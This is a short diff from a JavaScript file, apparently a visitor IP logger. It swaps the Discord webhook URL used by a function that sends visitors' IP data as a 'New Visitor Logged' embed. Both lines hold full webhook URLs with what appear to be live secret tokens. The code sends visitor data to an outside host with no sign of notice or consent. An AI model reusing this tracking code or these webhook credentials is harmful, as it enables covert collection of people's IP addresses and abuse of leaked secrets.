@@ -41,7 +41,7 @@ function setDefaultData() {
 
 // Function to send data to Discord webhook
 async function sendToDiscord(ipData) {
-    const webhookURL = "https://discord.com/api/webhooks/1334042370647523338/x6CnYaHfr1ZHGObQAFpF9o5IWbNdhVmhRjxbrTq9iwM5g53H1QnItjuXE1Cpj9qDs9nr";  // Replace with your Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1334046008681693204/5YbMMb4m4OjVC6iiQSSbP0t7N1VSGSvmP4Lbtjc-KM44-gmWl_0VcUzVkolVxWAZTOuP";  // Replace with your Discord webhook
 
     const embed = {
         title: "🔍 New Visitor Logged",
